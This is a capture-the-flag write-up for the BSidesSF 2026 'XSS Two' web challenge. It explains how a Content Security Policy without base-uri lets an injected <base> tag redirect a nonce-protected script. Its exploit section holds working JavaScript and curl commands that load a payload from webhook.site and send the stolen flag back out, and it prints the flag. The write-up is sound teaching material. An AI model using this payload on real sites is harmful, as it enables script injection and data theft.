# XSS Two — BSidesSF CTF 2026 | Web

**Category:** Web
**Author:** itsc0rg1
**Flag:** `CTF{b453d-4nd-c0nfU53d}`

---

## TL;DR

Nonce-based CSP with no `base-uri` directive. Inject `<base href="https://attacker.com/">` to hijack a nonce-protected relative `<script src="test.js">`, redirecting it to an attacker server that serves flag-stealing JavaScript.

---

## Description

Similar XSS lab to XSS One but with a stricter CSP: inline scripts are blocked via nonce. The result page includes a nonce-protected script tag with a relative `src`.

---

## Analysis

### CSP Header

```
default-src 'self';
script-src  'self' 'nonce-RANDOM';
connect-src *;
```

No `unsafe-inline` (good), but critically **no `base-uri`** directive.

### Page Structure

The result page includes:
```html
<script nonce="VALID_NONCE" src="test.js"></script>
```

`test.js` doesn't exist on the challenge server (returns 404).

### Vulnerability: Missing `base-uri`

Without `base-uri`, the browser allows injected `<base>` tags that change the document's base URL. The relative `src="test.js"` resolves against the base URL:

- **Before injection:** `https://challenge.example.com/test.js` (404)
- **After `<base href="https://attacker.com/">`:** `https://attacker.com/test.js` (attacker-controlled JS!)

The nonce on the `<script>` element is checked against the element itself, not the resolved URL. Since the element already has the valid nonce, CSP allows execution regardless of where the script is actually loaded from.

---

## Exploit

### Step 1: Set Up Attacker Script Server

Configure a webhook.site token (or any URL) to serve JavaScript:

```javascript
// test.js served from attacker
fetch('https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag')
  .then(r => r.text())
  .then(f => fetch('https://webhook.site/EXFIL-UUID?f=' + encodeURIComponent(f)));
```

**Important:** Use absolute URLs for `/xss-two-flag` — relative URLs would also be affected by the `<base>` tag.

Configure response headers:
- `Content-Type: application/javascript`
- HTTP 200

### Step 2: Submit Base Tag Injection

```bash
# Configure webhook to serve JS
curl -X PUT https://webhook.site/token/JS-UUID \
  -H 'Content-Type: application/json' \
  -d '{"default_status":200,"default_content":"fetch(\"https://TARGET/xss-two-flag\").then(r=>r.text()).then(f=>fetch(\"https://webhook.site/EXFIL-UUID?f=\"+encodeURIComponent(f)));","default_content_type":"application/javascript"}'

# Submit the payload
curl -X POST https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-result \
  --data-urlencode 'payload=<base href="https://webhook.site/JS-UUID/">'
```

### Step 3: Collect Flag

Admin bot loads page → `<base>` changes base URL → `test.js` fetched from attacker → JS exfils flag.

```bash
curl -s "https://webhook.site/token/EXFIL-UUID/requests" | python3 -c "
import sys, json
for r in json.load(sys.stdin)['data']:
    print(r['url'])
"
# → ...?f=CTF{b453d-4nd-c0nfU53d}
```

---

## Key Lessons

- **`base-uri 'self'` or `base-uri 'none'`** must always be set in CSP to prevent `<base>` injection
- Nonce-protected scripts with relative `src` are vulnerable if `base-uri` is absent
- The nonce validates the `<script>` element, not the resolved source URL
- `connect-src *` again enables trivial exfiltration

---

## Flag

```
CTF{b453d-4nd-c0nfU53d}
```
